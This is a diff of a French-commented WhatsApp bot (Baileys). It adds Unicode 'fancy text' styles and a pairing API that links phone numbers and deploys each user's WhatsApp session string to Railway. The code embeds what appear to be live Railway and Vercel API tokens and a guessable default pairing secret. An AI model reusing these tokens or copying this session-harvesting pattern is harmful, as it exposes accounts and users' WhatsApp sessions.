+      { map: {'a':'ᵃ','b':'ᵇ','c':'ᶜ','d':'ᵈ','e':'ᵉ','f':'ᶠ','g':'ᵍ','h':'ʰ','i':'ⁱ','j':'ʲ','k':'ᵏ','l':'ˡ','m':'ᵐ','n':'ⁿ','o':'ᵒ','p':'ᵖ','q':'q','r':'ʳ','s':'ˢ','t':'ᵗ','u':'ᵘ','v':'ᵛ','w':'ʷ','x':'ˣ','y':'ʸ','z':'ᶻ','A':'ᴬ','B':'ᴮ','C':'ᶜ','D':'ᴰ','E':'ᴱ','F':'ᶠ','G':'ᴳ','H':'ᴴ','I':'ᴵ','J':'ᴶ','K':'ᴷ','L':'ᴸ','M':'ᴹ','N':'ᴺ','O':'ᴼ','P':'ᴾ','Q':'Q','R':'ᴿ','S':'ˢ','T':'ᵀ','U':'ᵁ','V':'ᵛ','W':'ᵂ','X':'ˣ','Y':'ʸ','Z':'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'} },
+      // 22 - Thai style
+      { map: {'a':'ค','b':'๖','c':'ς','d':'๔','e':'є','f':'f','g':'ﻮ','h':'h','i':'ﺎ','j':'ﻝ','k':'k','l':'l','m':'๓','n':'ห','o':'๏','p':'p','q':'q','r':'r','s':'ร','t':'t','u':'ย','v':'ν','w':'ω','x':'x','y':'ч','z':'z','A':'ค','B':'๖','C':'ς','D':'๔','E':'є','F':'F','G':'ﻮ','H':'H','I':'ﺎ','J':'ﻝ','K':'K','L':'L','M':'๓','N':'ห','O':'๏','P':'P','Q':'Q','R':'R','S':'ร','T':'T','U':'ย','V':'Ν','W':'Ω','X':'X','Y':'Ч','Z':'Z'} },
+      // 23 - Double struck 𝕫𝕠𝕜𝕠𝕦
+      { range: [0x1D538, 0x1D551, 0x1D538] },
+      // 24 - Fraktur 𝖅𝖔𝖐𝖔𝖚
+      { range: [0x1D504, 0x1D51D, 0x1D504] },
+      // 25 - Negative squared 🆉🅾🅺🅾🆄
+      { map: {'a':'🅰','b':'🅱','c':'🅲','d':'🅳','e':'🅴','f':'🅵','g':'🅶','h':'🅷','i':'🅸','j':'🅹','k':'🅺','l':'🅻','m':'🅼','n':'🅽','o':'🅾','p':'🅿','q':'🆀','r':'🆁','s':'🆂','t':'🆃','u':'🆄','v':'🆅','w':'🆆','x':'🆇','y':'🆈','z':'🆉','A':'🅰','B':'🅱','C':'🅲','D':'🅳','E':'🅴','F':'🅵','G':'🅶','H':'🅷','I':'🅸','J':'🅹','K':'🅺','L':'🅻','M':'🅼','N':'🅽','O':'🅾','P':'🅿','Q':'🆀','R':'🆁','S':'🆂','T':'🆃','U':'🆄','V':'🆅','W':'🆆','X':'🆇','Y':'🆈','Z':'🆉'} },
+      // 26 - Script Bold 𝓩𝓸𝓴𝓸𝓾
+      { range: [0x1D4D0, 0x1D4E9, 0x1D4D0] },
+      // 27 - Fraktur 𝔷𝔬𝔨𝔬𝔲
+      { range: [0x1D51E, 0x1D537, 0x1D51E] },
+      // 28 - Fullwidth Ｚｏｋｏｕ
+      { map: {'a':'ａ','b':'ｂ','c':'ｃ','d':'ｄ','e':'ｅ','f':'ｆ','g':'ｇ','h':'ｈ','i':'ｉ','j':'ｊ','k':'ｋ','l':'ｌ','m':'ｍ','n':'ｎ','o':'ｏ','p':'ｐ','q':'ｑ','r':'ｒ','s':'ｓ','t':'ｔ','u':'ｕ','v':'ｖ','w':'ｗ','x':'ｘ','y':'ｙ','z':'ｚ','A':'Ａ','B':'Ｂ','C':'Ｃ','D':'Ｄ','E':'Ｅ','F':'Ｆ','G':'Ｇ','H':'Ｈ','I':'Ｉ','J':'Ｊ','K':'Ｋ','L':'Ｌ','M':'Ｍ','N':'Ｎ','O':'Ｏ','P':'Ｐ','Q':'Ｑ','R':'Ｒ','S':'Ｓ','T':'Ｔ','U':'Ｕ','V':'Ｖ','W':'Ｗ','X':'Ｘ','Y':'Ｙ','Z':'Ｚ',' ':'　','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'} },
+      // 29 - Small caps ᴢᴏᴋᴏᴜ
+      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
+      // 30 - Italic 𝑍𝒐𝒌𝒐𝒖
+      { range: [0x1D434, 0x1D44D, 0x1D434] },
+      // 31 - Math bold 𝛧𝛩𝛫𝛩𝑈
+      { map: {'a':'𝛼','b':'𝛽','c':'𝛾','d':'𝛿','e':'𝜀','f':'𝜁','g':'𝜂','h':'𝜃','i':'𝜄','j':'𝜅','k':'𝜆','l':'𝜇','m':'𝜈','n':'𝜉','o':'𝜊','p':'𝜋','q':'𝜌','r':'𝜍','s':'𝜎','t':'𝜏','u':'𝜐','v':'𝜑','w':'𝜒','x':'𝜓','y':'𝜔','z':'z','A':'𝛢','B':'𝛣','C':'𝛤','D':'𝛥','E':'𝛦','F':'𝛧','G':'𝛨','H':'𝛩','I':'𝛪','J':'𝛫','K':'𝛬','L':'𝛭','M':'𝛮','N':'𝛯','O':'𝛰','P':'𝛱','Q':'𝛲','R':'𝛳','S':'𝛴','T':'𝛵','U':'𝛶','V':'𝛷','W':'𝛸','X':'𝛹','Y':'𝛺','Z':'𝛻'} },
+      // 32 - Math Monospace Bold 𝚭𝚯𝐊𝚯𝐔
+      { map: {'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒','j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛','s':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣','A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉'} },
+      // 33 - ɀꪮᛕꪮꪊ Vai/Runic mix
+      { map: {'a':'ꪖ','b':'ꪜ','c':'ꪊ','d':'ᦔ','e':'ꫀ','f':'ꪰ','g':'ᧁ','h':'ꫝ','i':'ꪱ','j':'ꪝ','k':'ᛕ','l':'ꪶ','m':'ꪑ','n':'ꪀ','o':'ꪮ','p':'ρ','q':'ꪕ','r':'ꪹ','s':'ꫛ','t':'ꪻ','u':'ꪊ','v':'ꪜ','w':'ꪲ','x':'ꪤ','y':'ꪗ','z':'ɀ','A':'ꪖ','B':'ꪜ','C':'ꪊ','D':'ᦔ','E':'ꫀ','F':'ꪰ','G':'ᧁ','H':'ꫝ','I':'ꪱ','J':'ꪝ','K':'ᛕ','L':'ꪶ','M':'ꪑ','N':'ꪀ','O':'ꪮ','P':'ρ','Q':'ꪕ','R':'ꪹ','S':'ꫛ','T':'ꪻ','U':'ꪊ','V':'ꪜ','W':'ꪲ','X':'ꪤ','Y':'ꪗ','Z':'ɀ'} },
+      // 34 - plain lowercase
+      { map: {'a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z','A':'a','B':'b','C':'c','D':'d','E':'e','F':'f','G':'g','H':'h','I':'i','J':'j','K':'k','L':'l','M':'m','N':'n','O':'o','P':'p','Q':'q','R':'r','S':'s','T':'t','U':'u','V':'v','W':'w','X':'x','Y':'y','Z':'z'} },
+      // 35 - Bold Italic Script 𝒁𝒐𝒌𝒐𝒖
+      { range: [0x1D400, 0x1D419, 0x1D400], italic: true },
+      // 36 - Circled letters Ⓩⓞⓚⓞⓤ
+      { map: {'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ','k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ','u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ','A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ','K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ','U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'} },
+      // 37 - Upside down Zoʞon-ɯp
+      { map: {'a':'ɐ','b':'q','c':'ɔ','d':'p','e':'ǝ','f':'ɟ','g':'ƃ','h':'ɥ','i':'ı','j':'ɾ','k':'ʞ','l':'l','m':'ɯ','n':'u','o':'o','p':'d','q':'b','r':'ɹ','s':'s','t':'ʇ','u':'n','v':'ʌ','w':'ʍ','x':'x','y':'ʎ','z':'z','A':'∀','B':'q','C':'Ɔ','D':'p','E':'Ǝ','F':'Ⅎ','G':'פ','H':'H','I':'I','J':'ɾ','K':'ʞ','L':'˥','M':'W','N':'N','O':'O','P':'d','Q':'Q','R':'ɹ','S':'S','T':'┴','U':'∩','V':'Λ','W':'M','X':'X','Y':'⅄','Z':'Z'} },
+      // 38 = same as 29 (small caps)
+      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
+      // 39 = same as 27
+      { range: [0x1D51E, 0x1D537, 0x1D51E] },
+      // 40 = same as 15
+      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
+      // 41 = same as 5
+      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
+      // 42 - Negative circled 🅩🅞🅚🅞🅤
+      { map: {'a':'🅐','b':'🅑','c':'🅒','d':'🅓','e':'🅔','f':'🅕','g':'🅖','h':'🅗','i':'🅘','j':'🅙','k':'🅚','l':'🅛','m':'🅜','n':'🅝','o':'🅞','p':'🅟','q':'🅠','r':'🅡','s':'🅢','t':'🅣','u':'🅤','v':'🅥','w':'🅦','x':'🅧','y':'🅨','z':'🅩','A':'🅐','B':'🅑','C':'🅒','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'🅗','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'🅝','O':'🅞','P':'🅟','Q':'🅠','R':'🅡','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'🅩'} },
+      // 43 - Underline Z̲o̲k̲o̲u̲
+      { underline: true },
+    ];
+
+    const style = styles[styleIndex];
+    if (!style) return text;
+
+    // Style with underline
+    if (style.underline) {
+      return text.split('').map(c => c !== ' ' ? c + '\u0332' : c).join('');
+    }
+
+    // Style with range Unicode (mathématique)
+    if (style.range) {
+      const [upperBase, , lowerBase] = style.range;
+      return text.split('').map(c => {
+        const code = c.charCodeAt(0);
+        if (code >= 65 && code <= 90) return String.fromCodePoint(upperBase + (code - 65));
+        if (code >= 97 && code <= 122) return String.fromCodePoint(lowerBase + (code - 97));
+        return c;
+      }).join('');
+    }
+
+    // Style with map
+    if (style.map) {
+      return text.split('').map(c => style.map[c] || c).join('');
+    }
+
+    return text;
+  }
+
+  const TOTAL_STYLES = 43;
+
+  // Un seul style demandé
+  if (styleNum !== null && styleNum >= 1 && styleNum <= TOTAL_STYLES) {
+    const result = applyStyle(text, styleNum - 1);
+    await sock.sendMessage(remoteJid, {
+      text: `✨ *Style ${styleNum}:*\n\n${result}`
+    });
+    return;
+  }
+
+  // Tous les styles — envoyer en un seul message
+  const lines = [];
+  for (let i = 1; i <= TOTAL_STYLES; i++) {
+    try {
+      const result = applyStyle(text, i - 1);
+      lines.push(`*${i}.* ${result}`);
+    } catch(e) {
+      lines.push(`*${i}.* ${text}`);
+    }
+  }
+
+  const output = `✨ *FANCY — ${text}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${lines.join('\n')}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n_${config.prefix}fancy [1-${TOTAL_STYLES}] [texte] pour un style spécifique_`;
+
+  await sock.sendMessage(remoteJid, { text: output });
+}
+
+function formatUptime(seconds) {
+  const hours = Math.floor(seconds / 3600);
+  const minutes = Math.floor((seconds % 3600) / 60);
+  const secs = Math.floor(seconds % 60);
+  return `${hours}h ${minutes}m ${secs}s`;
+}
+
+// =============================================
+// LANCEMENT DU BOT
+// =============================================
+
+console.log('╔══════════════════════════════╗');
+console.log('║   SEIGNEUR TD v3.5  ║');
+console.log('╚══════════════════════════════╝\n');
+
+
+
+// =============================================
+// 🌐 MULTI-SESSION PAIRING SYSTEM
+// Inspiré du système Seigneur TD Bot
+// =============================================
+
+// Map des sessions actives: phone -> { sock, status, pairingCode, createdAt }
+const activeSessions = new Map();
+
+const PAIRING_PORT   = process.env.PAIRING_PORT || 2003;
+const PAIRING_SECRET = process.env.PAIRING_SECRET || 'cybertoji-secret-2026';
+
+// Vérifier si session a des credentials valides
+function sessionHasCredentials(phone) {
+  const sessionFolder = './sessions/' + phone;
+  const credsFile = sessionFolder + '/creds.json';
+  try {
+    if (!fs.existsSync(credsFile)) return false;
+    const creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
+    return !!(creds?.me?.id || creds?.registered);
+  } catch(e) { return false; }
+}
+
+// ─── Créer une nouvelle session utilisateur via worker ────────────────────────
+async function createUserSession(phone) {
+  const sessionFolder = './sessions/' + phone;
+  try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
+  fs.mkdirSync(sessionFolder, { recursive: true });
+
+  activeSessions.set(phone, { sock: null, status: 'pending', pairingCode: null, createdAt: Date.now() });
+
+  return new Promise((resolve, reject) => {
+    // Lancer le worker @whiskeysockets/baileys dans un process séparé
+    const worker = fork('./pairing-worker.js', [phone, sessionFolder], {
+      stdio: ['pipe', 'pipe', 'pipe', 'ipc']
+    });
+
+    const timeout = setTimeout(() => {
+      worker.kill();
+      activeSessions.delete(phone);
+      reject(new Error('Timeout — réessaie dans quelques secondes'));
+    }, 60000);
+
+    worker.on('message', async (msg) => {
+      if (msg.type === 'code') {
+        clearTimeout(timeout);
+        const session = activeSessions.get(phone);
+        if (session) session.pairingCode = msg.code;
+        console.log('[' + phone + '] ✅ Code généré: ' + msg.code);
+        resolve(msg.code);
+      }
+
+      if (msg.type === 'connected') {
+        const session = activeSessions.get(phone);
+        if (session) { session.status = 'connected'; session.connectedAt = Date.now(); }
+        console.log('[' + phone + '] ✅ Connecté !');
+      }
+
+      if (msg.type === 'session') {
+        console.log('[' + phone + '] Session reçue — déploiement Railway...');
+        const deploy = await deployToRailway(msg.phone, msg.sessionString);
+        if (deploy.success) {
+          console.log('[' + phone + '] 🚀 Bot Railway déployé !');
+        } else {
+          console.error('[' + phone + '] Erreur Railway: ' + deploy.error);
+        }
+      }
+
+      if (msg.type === 'error') {
+        clearTimeout(timeout);
+        activeSessions.delete(phone);
+        reject(new Error(msg.message));
+      }
+
+      if (msg.type === 'reconnecting') {
+        console.log('[' + phone + '] Reconnexion WS silencieuse...');
+      }
+    });
+
+    worker.on('exit', (code) => {
+      console.log('[' + phone + '] Worker terminé (code: ' + code + ')');
+    });
+
+    worker.on('error', (e) => {
+      clearTimeout(timeout);
+      activeSessions.delete(phone);
+      reject(new Error('Worker erreur: ' + e.message));
+    });
+  });
+}
+
+// ─── Déploiement automatique sur Railway ────────────────────────────────────
+async function railwayGQL(token, query, variables = {}) {
+  const res = await axios.post('https://backboard.railway.app/graphql/v2',
+    { query, variables },
+    { headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }, timeout: 30000 }
+  );
+  if (res.data?.errors) throw new Error(res.data.errors[0]?.message || 'GraphQL error');
+  return res.data?.data;
+}
+
+async function deployToRailway(phone, sessionString) {
+  const RAILWAY_TOKEN = config.railwayToken || process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a';
+  const GITHUB_REPO = 'lord007-maker/CYBERTOJI-XMD-';
+  try {
+    console.log('[RAILWAY] Déploiement pour ' + phone + '...');
+
+    // 1. Créer le projet
+    const p = await railwayGQL(RAILWAY_TOKEN,
+      'mutation CreateProject($name: String!) { projectCreate(input: { name: $name, defaultEnvironmentName: "production" }) { id name } }',
+      { name: 'cybertoji-' + phone }
+    );
+    const projectId = p?.projectCreate?.id;
+    if (!projectId) throw new Error('Impossible de créer le projet Railway');
+    console.log('[RAILWAY] Projet: ' + projectId);
+
+    // 2. Récupérer l'environment
+    const e = await railwayGQL(RAILWAY_TOKEN,
+      'query GetEnv($id: String!) { project(id: $id) { environments { edges { node { id name } } } } }',
+      { id: projectId }
+    );
+    const envId = e?.project?.environments?.edges?.[0]?.node?.id;
+    if (!envId) throw new Error('Environment Railway introuvable');
+
+    // 3. Créer le service (sans source GitHub)
+    const s = await railwayGQL(RAILWAY_TOKEN,
+      'mutation CreateService($projectId: String!, $name: String!) { serviceCreate(input: { projectId: $projectId, name: $name }) { id } }',
+      { projectId, name: 'bot-' + phone }
+    );
+    const serviceId = s?.serviceCreate?.id;
+    if (!serviceId) throw new Error('Impossible de créer le service Railway');
+    console.log('[RAILWAY] Service: ' + serviceId);
+
+    // 4. Connecter GitHub au service
+    await railwayGQL(RAILWAY_TOKEN,
+      'mutation ConnectGithub($id: String!, $repo: String!, $branch: String!) { serviceConnect(id: $id, input: { source: { repo: $repo, branch: $branch } }) { id } }',
+      { id: serviceId, repo: GITHUB_REPO, branch: 'main' }
+    ).catch(async () => {
+      // Fallback: utiliser serviceInstanceUpdate
+      await railwayGQL(RAILWAY_TOKEN,
+        'mutation UpdateInstance($serviceId: String!, $envId: String!, $repo: String!) { serviceInstanceUpdate(serviceId: $serviceId, environmentId: $envId, input: { source: { repo: $repo, branch: "main" } }) }',
+        { serviceId, envId, repo: GITHUB_REPO }
+      );
+    });
+
+    // 5. Variables d'environnement
+    await railwayGQL(RAILWAY_TOKEN,
+      'mutation SetVars($projectId: String!, $envId: String!, $serviceId: String!, $vars: Json!) { variableCollectionUpsert(input: { projectId: $projectId, environmentId: $envId, serviceId: $serviceId, variables: $vars }) }',
+      { projectId, envId, serviceId, vars: { SESSION_ID: sessionString, OWNER_NUMBER: phone, BOT_NAME: 'SEIGNEUR TD' } }
+    );
+
+    // 6. Déclencher le déploiement
+    await railwayGQL(RAILWAY_TOKEN,
+      'mutation Deploy($serviceId: String!, $envId: String!) { serviceInstanceDeploy(serviceId: $serviceId, environmentId: $envId) }',
+      { serviceId, envId }
+    ).catch(() => console.log('[RAILWAY] Deploy déclenché (ou déjà en cours)'));
+
+    console.log('[RAILWAY] ✅ Déployé pour ' + phone);
+    return { success: true, projectId, serviceId };
+  } catch(e) {
+    console.error('[RAILWAY] Erreur:', e.message);
+    return { success: false, error: e.message };
+  }
+}
+
+// ─── Serveur HTTP Pairing API ─────────────────────────────────────────────────
+createServer(async (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key, X-Secret');
+  res.setHeader('Content-Type', 'application/json');
+  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }
+  const apiKey = req.headers['x-api-key'] || req.headers['x-secret'];
+  if (req.url?.split('?')[0] !== '/health' && apiKey !== PAIRING_SECRET) {
+    res.writeHead(401); res.end(JSON.stringify({ error: 'Non autorisé' })); return;
+  }
+  let body = {};
+  if (req.method === 'POST') {
+    body = await new Promise((resolve) => {
+      let data = '';
+      req.on('data', chunk => data += chunk);
+      req.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({}); } });
+    });
+  }
+  const url = req.url?.split('?')[0];
+  if (req.method === 'GET' && url === '/health') {
+    res.writeHead(200); res.end(JSON.stringify({ status: 'online', bot: config.botName })); return;
+  }
+  if (req.method === 'POST' && url === '/pair') {
+    const phone = body.phone?.replace(/\D/g, '');
+    if (!phone || phone.length < 7) { res.writeHead(400); res.end(JSON.stringify({ error: 'Numéro invalide' })); return; }
+    if (activeSessions.has(phone)) {
+      const existing = activeSessions.get(phone);
+      if (existing.status === 'connected') { res.writeHead(200); res.end(JSON.stringify({ status: 'already_connected', phone })); return; }
+      if (existing.pairingCode) { res.writeHead(200); res.end(JSON.stringify({ code: existing.pairingCode, phone })); return; }
+      try { existing.sock?.ws?.close(); } catch {}
+      activeSessions.delete(phone);
+    }
+    try {
+      console.log('[PAIRING API] Nouvelle session pour: ' + phone);
+      const code = await createUserSession(phone);
+      res.writeHead(200); res.end(JSON.stringify({ code, phone }));
+    } catch(e) {
+      console.error('[PAIRING API] Erreur:', e.message);
+      res.writeHead(500); res.end(JSON.stringify({ error: e.message }));
+    }
+    return;
+  }
+  if (req.method === 'GET' && url === '/status') {
+    const phone = req.url?.split('phone=')[1]?.replace(/\D/g, '');
+    const session = activeSessions.get(phone);
+    if (!session) { res.writeHead(200); res.end(JSON.stringify({ status: 'not_found' })); return; }
+    res.writeHead(200); res.end(JSON.stringify({ status: session.status, phone, pairingCode: session.pairingCode }));
+    return;
+  }
+  res.writeHead(404); res.end(JSON.stringify({ error: 'Route non trouvée' }));
+}).listen(PAIRING_PORT, () => {
+  console.log('[PAIRING API] Serveur en ligne sur port ' + PAIRING_PORT);
+});
+
+// ─── Mise à jour automatique BOT_URL sur Vercel ──────────────────────────────
+async function updateVercelEnv(newUrl) {
+  const VERCEL_TOKEN      = process.env.VERCEL_TOKEN || 'vcp_17K2l1zVnOGZypei3ngYAJvdwjoBb7wcocROos921yjBcMJzRx0aYXRR';
+  const VERCEL_PROJECT_ID = process.env.VERCEL_PROJECT_ID || 'prj_1ocACI1X4TkMN0XtqzEUhwQifymq';
+
+  if (VERCEL_TOKEN === 'METS_TON_TOKEN_ICI') {
+    console.log('[VERCEL] ⚠️ VERCEL_TOKEN non configuré — mets à jour BOT_URL manuellement: ' + newUrl);
+    return;
+  }
+
+  try {
+    console.log('[VERCEL] Mise à jour BOT_URL → ' + newUrl + '...');
+
+    // Supprimer l'ancienne variable BOT_URL
+    await axios.delete('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/BOT_URL', {
+      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
+    }).catch(() => {});
+
+    // Récupérer la liste des variables pour trouver l'ID de BOT_URL
+    const listRes = await axios.get('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env', {
+      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
+    });
+
+    const envVars = listRes.data?.envs || [];
+    const botUrlVar = envVars.find(e => e.key === 'BOT_URL');
+
+    if (botUrlVar) {
+      // Mettre à jour la variable existante
+      await axios.patch(
+        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/' + botUrlVar.id,
+        { value: newUrl, target: ['production', 'preview', 'development'] },
+        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
+      );
+    } else {
+      // Créer la variable
+      await axios.post(
+        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env',
+        { key: 'BOT_URL', value: newUrl, type: 'plain', target: ['production', 'preview', 'development'] },
+        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Redéployer Vercel pour appliquer la nouvelle variable
+    await axios.post(
+      'https://api.vercel.com/v13/deployments',
+      { name: 'cybertoji-pair', gitSource: { type: 'github', repoId: VERCEL_PROJECT_ID, ref: 'main' } },
+      { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
+    ).catch(() => {});
+
+    console.log('[VERCEL] ✅ BOT_URL mis à jour: ' + newUrl);
+  } catch(e) {
+    console.log('[VERCEL] ❌ Erreur mise à jour:', e.message);
+    console.log('[VERCEL] → Mets à jour BOT_URL manuellement: ' + newUrl);
+  }
+}
+
+connectToWhatsApp().catch(err => {
+  console.error('Failed to start bot:', err);
+  saveData();
+  process.exit(1);
+});
+
+process.on('SIGINT', () => {
+  console.log('\n\n👋 Bot shutting down...');
+  saveData();
+  process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+  console.log('\n\n🛑 SIGTERM reçu — arrêt propre...');
+  saveData();
+  process.exit(0);
+});
+
+process.on('uncaughtException', (err) => {
+  console.error('[SEIGNEUR TD] Uncaught Exception:', err.message);
+  try { saveData(); } catch(e) {}
+  // Ne pas quitter — continuer à tourner
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('[SEIGNEUR TD] Unhandled Rejection:', reason?.message || reason);
+  // Ne pas quitter — continuer à tourner
+});
